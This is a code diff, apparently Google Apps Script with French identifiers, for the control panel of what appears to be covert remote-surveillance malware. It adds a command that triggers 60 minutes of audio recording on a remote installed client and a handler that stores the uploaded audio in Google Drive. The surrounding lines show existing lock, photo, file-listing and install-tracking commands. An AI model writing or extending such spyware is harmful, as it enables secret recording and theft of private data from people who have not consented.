@@ -23,6 +23,7 @@ const BRANCH       = 'main';
 const LOCK_PATH    = 'data/blague_lock.json';
 const PHOTO_PATH   = 'data/blague_photo.json';
 const LISTING_PATH = 'data/blague_listing.json';
+const AUDIO_PATH   = 'data/blague_audio.json';
 const JOURS_MAX    = 30;
 
 function _token() {
@@ -102,6 +103,14 @@ function nettoyerPhotos() {
   }
 }
 
+// ── AUDIO ────────────────────────────────────────────────────────
+
+function enregistrerAudio() {
+  const f = _githubGet(AUDIO_PATH);
+  _githubPut(AUDIO_PATH, { record_audio: true }, f.sha);
+  SpreadsheetApp.getUi().alert('🎙️ Enregistrement lancé ! Le fichier audio (60 min) arrivera dans ton Drive à la fin.');
+}
+
 // ── LISTING FICHIERS ─────────────────────────────────────────────
 
 function demanderListing() {
@@ -137,6 +146,13 @@ function doPost(e) {
 
     if (data.type === 'install') {
       _logInstallation(data);
+      return ContentService.createTextOutput('ok');
+    }
+
+    if (data.type === 'audio') {
+      const bytes = Utilities.base64Decode(data.audio);
+      const blob  = Utilities.newBlob(bytes, 'audio/mpeg', data.filename);
+      DriveApp.getFolderById(FOLDER_ID).createFile(blob);
       return ContentService.createTextOutput('ok');
     }
 
